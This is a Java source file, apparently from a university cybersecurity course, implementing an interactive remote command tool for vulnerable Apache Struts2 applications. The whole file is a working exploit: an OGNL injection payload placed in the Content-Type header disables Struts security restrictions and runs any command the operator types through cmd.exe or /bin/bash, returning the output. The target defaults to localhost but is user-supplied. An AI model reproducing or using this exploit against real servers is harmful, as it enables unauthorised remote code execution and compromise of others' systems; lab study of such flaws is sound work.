package edu.uvu.ms.cybersecurity;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class Send {
    public static String DEF_URL = "http://localhost:8080/MSCybersecurity/exploit";
    public static String CONTENT_TYPE = "Content-Type";
    public static String EXPLOIT = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='*?')" +
            ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";

    public static void main(String[] args) {
        banner();
        String url = getURL();
        System.out.println("Using URL: "+url);
        while (true) {
            try {

                String cmd = getInput("command");
                String fmt = EXPLOIT.replace("*?",cmd);

                send(url,fmt,cmd);
                System.out.println(" ");
            } catch (Exception e) {
                System.out.println("Command failed due to " + e);
            }

        }
    }

    public static String getURL(){
        String url =getInput("url");
        if(url == null || url.equals("")){
            url = DEF_URL;
        }
        return url;
    }

    public static String getInput(String msg) {
        System.out.print(String.format("Enter %s: ", msg));
        Scanner sc = new Scanner(System.in);
        String message = sc.nextLine();
        return message;
    }

    private static void send(String loc, String exp, String cmd) throws IOException {
        URL url = new URL(loc);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty(CONTENT_TYPE, exp);
        con.setDoOutput(true);
        Integer status = con.getResponseCode();

        if (status.equals(200)) {
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String output_line;
            StringBuffer resp = new StringBuffer();
            while ((output_line = in.readLine()) != null) {
                resp.append(output_line+"\n");
            }
            in.close();
            System.out.println("----------RESPONSE----------");
            System.out.println("URL: "+loc);
            System.out.println("CMD: "+cmd+"\n");
            System.out.println(resp.toString());
            System.out.println("----------------------------");
        }

        if(!status.equals(200)){
            System.out.println("failed to send command...");
        }
    }

    private static void banner() {
        System.out.println("********************************************");
        System.out.println("* Send commands to vulnerable Struts2 apps *");
        System.out.println("********************************************");
    }
}
